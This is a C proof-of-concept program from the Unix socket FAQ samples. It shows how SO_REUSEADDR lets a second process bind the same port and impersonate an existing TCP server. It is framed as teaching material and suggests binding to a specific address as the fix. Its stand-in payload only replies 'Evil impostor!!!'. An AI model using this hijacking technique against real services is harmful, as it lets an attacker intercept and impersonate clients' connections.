/*
 *  This is an example of how to exploit the security hole in using
 *  SO_REUSEADDR.  It is not intended as a resource for would be
 *  "hackers" (in the hollywood sense of the word), but for
 *  programmers so that they can learn about the vulnerability,
 *  find out if their environment is vulnerable, and write servers
 *  that can not be compromised in this way.
 *
 *  This is a modification of the tcpserver.c source included in
 *  the example code for the unix-socket-faq.  The faq can be found
 *  at the following sources:
 *    http://www.auroraonline.com/sock-faq
 *    http://kipper.york.ac.uk/~vic/sock-faq
 *    ftp://rtfm.mit.edu/pub/usenet/news.answers/unix-faq/socket
 *
 *  The most recent version of the sample source includes a modified
 *  Makefile which knows about this file.  Copy this file into the
 *  sample source directory and type 'make reuseaddr' to compile.
 *
 *  To try it out, run tcpserver, followed by tcpclient to verify
 *  that it is working correctly.  Then run reuseaddr, passing the
 *  same port number as you did to tcpserver, and the hostname of
 *  the server.  When you next run tcpclient, you will be talking
 *  to the reuseaddr server instead of the tcpserver server.
 *
 *  Although this works under linux 1.2.13, it may be "fixed" on
 *  other systems.  Possible solutions to the problem should be
 *  to either not use SO_REUSEADDR, or have your server bind to
 *  the server's address specifically.  Is there any reason not
 *  to do this?
 */

#include "sockhelp.h"
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <string.h>
#include <sys/wait.h>
#include <ctype.h>

/* This waits for all children, so that they don't become zombies. */
void sig_chld(signal_type)
int signal_type;
{
  int pid;
  int status;

  while ( (pid = wait3(&status, WNOHANG, NULL)) > 0);
}

int main(argc, argv)
int argc;
char *argv[];
{
  int sock = -1;
  int connected = 1;
  char buffer[1024];
  char *current_character;
  int port = -1;
  struct sigaction act, oldact;
  struct in_addr *addr;
  struct sockaddr_in address;
  int listening;
  int reuse_addr = 1;
  int new_process;

  if (argc != 3) {
    fprintf(stderr,"Usage:  tcpserver port addr\n");
    fprintf(stderr,"Where port is the port number or service name to\n");
    fprintf(stderr,"listen to, and addr is the host address to bind to.\n");
    exit(-1);
  }
  sigemptyset(&act.sa_mask);
  act.sa_flags = 0;
  act.sa_handler = sig_chld;
  sigaction(SIGCHLD, &act, &oldact);

  port = atoport(argv[1], "tcp");
  if (port == -1) {
    fprintf(stderr,"Unable to find service: %s\n",argv[1]);
    exit(-1);
  }

  addr = atoaddr(argv[2]);
  if (addr == NULL) {
    fprintf(stderr,"Unable to find host: %s\n",argv[2]);
    exit(-1);
  }

  listening = socket(AF_INET, SOCK_STREAM, 0);

  setsockopt(listening, SOL_SOCKET, SO_REUSEADDR, &reuse_addr,
    sizeof(reuse_addr));

  address.sin_family = AF_INET;
  address.sin_port = port;
  address.sin_addr.s_addr = addr->s_addr;

  if (bind(listening, (struct sockaddr *) &address, sizeof(address)) < 0) {
    perror("bind");
    close(listening);
    exit(-1);
  }
  
  listen(listening,5);

  while (sock < 0) {
    sock = accept(listening,NULL,NULL);
    if (sock < 0) {
      if (errno != EINTR) {
        perror("accept");
        close(listening);
        exit(-1);
      } else {
        continue;    /* don't fork - do the accept again */
      } /* errno != EINTR */
    } /* sock < 0 */
    new_process = fork();
    if (new_process < 0) {
      perror("fork");
      close(sock);
      sock = -1;
    } else { /* We have a new process... */
      if (new_process == 0) {
        /* This is the new process. */
        close(listening); /* Close our copy of this socket */
        listening = -1; /* Closed in this process.  We are not responsible
                           for it. */
      } else { /* Main Loop */
        close(sock);
        sock = -1;
      }
    }
  } /* While */

  sock_puts(sock,"Welcome to the upper case server.\n");
  while (connected) {
    /* Read input */
    if ( sock_gets(sock, buffer, 1024) < 0) {
      connected = 0;
    }
    else {
      if (sock_puts(sock, "Evil impostor!!!\n") < 0) {
        connected = 0;
      }
    }
  }
  close(sock);
  return 0;
}

